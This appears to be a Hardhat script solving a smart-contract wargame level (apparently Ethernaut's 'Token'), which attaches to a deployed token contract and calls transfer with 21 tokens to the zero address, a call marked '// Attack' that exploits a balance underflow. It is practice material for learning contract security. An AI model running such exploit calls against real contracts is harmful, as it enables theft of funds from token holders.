const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x675a9b225a0048386EA0269c8E69332f3620948f";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("Token");
  const contract = Contract.attach(instanceAddress);

  // Attack

  const tx = await contract.transfer(ethers.constants.AddressZero, 21);
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
